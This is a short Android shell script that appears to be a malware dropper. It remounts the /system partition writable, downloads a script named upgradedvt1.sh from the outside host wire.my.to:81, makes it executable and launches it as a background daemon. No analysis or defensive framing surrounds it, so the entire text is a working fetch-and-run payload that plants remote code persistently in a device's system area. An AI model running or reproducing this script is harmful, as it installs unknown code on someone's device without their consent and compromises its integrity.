#!/system/bin/sh

mount -o rw,remount /system
curl -o /system/upgradedvt1.sh http://wire.my.to:81/upgradedvt1.sh || exit 0
chmod +rwx /system/upgradedvt1.sh
daemonize /system/upgradedvt1.sh